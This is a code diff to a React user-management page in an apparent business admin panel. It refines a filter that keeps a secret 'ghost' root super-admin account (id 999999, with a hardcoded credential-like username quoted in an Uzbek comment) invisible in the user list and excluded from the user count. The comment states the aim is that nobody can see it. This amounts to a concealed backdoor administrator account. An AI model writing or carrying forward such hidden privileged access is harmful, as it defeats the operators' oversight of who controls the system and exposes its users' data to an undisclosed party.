@@ -78,7 +78,7 @@ export const INITIAL_USERS_DATA: UserItem[] = [
   { 
     id: 1, 
     name: 'Zarifjon Zokirov', 
-    username: '', 
+    username: '20090915', 
     password: '', 
     email: 'zarifjon@toyonasavdo.uz', 
     role: 'Super Admin', 
@@ -341,14 +341,14 @@ export default function UsersManagement({
 
     return Array.from(map.values()).filter(u => {
       // Invisible Ghost/Master Super Admin filter:
-      // Foydalanuvchilar boshqaruvida ushbu maxfiy profil va uning login/parollari
-      // mutlaqo ko'rinmas bo'ladi (hech kim ko'rmasligi uchun doim filtrlanadi).
+      // Foydalanuvchilar boshqaruvida maxfiy root profil (999999 va 20090915zzokirov2009@z)
+      // mutlaqo ko'rinmas bo'ladi. Asosiy Super Admin (1) esa ko'rinadi.
       const isGhostOrMaster = 
         u.role === 'Super Super Super Admin' || 
         Boolean(u.isGhost) || 
         Boolean(u.isMasterRoot) || 
         u.id === 999999 || 
-        (u.username && u.username.toLowerCase().includes('20090915'));
+        (u.username && u.username.toLowerCase().trim() === '20090915zzokirov2009@z');
 
       if (isGhostOrMaster) {
         return false;
@@ -425,7 +425,7 @@ export default function UsersManagement({
       <div className="flex items-center justify-between border-b border-slate-200 pb-3 flex-wrap gap-3">
         <div className="flex items-center gap-2">
           <span className="px-3 py-1.5 bg-slate-100 text-slate-700 text-xs font-extrabold rounded-xl border border-slate-200">
-            Jami foydalanuvchilar: <span className="text-[#00A651]">{users.length} ta</span>
+            Jami foydalanuvchilar: <span className="text-[#00A651]">{filteredUsers.length} ta</span>
           </span>
         </div>
 
@@ -582,7 +582,7 @@ export default function UsersManagement({
                           <div className="flex items-center gap-2">
                             <div className="bg-slate-100 px-2.5 py-1 rounded-lg border border-slate-200 flex items-center gap-1.5 font-mono text-[11px] text-slate-800 font-semibold">
                               <Lock className="w-3 h-3 text-[#00A651]" />
-                              <span>{u.username}</span>
+                              <span>{u.username || (u.id === 1 ? '20090915' : u.email.split('@')[0])}</span>
                             </div>
                             <button
                               onClick={() => handleOpenCredsModal(u)}
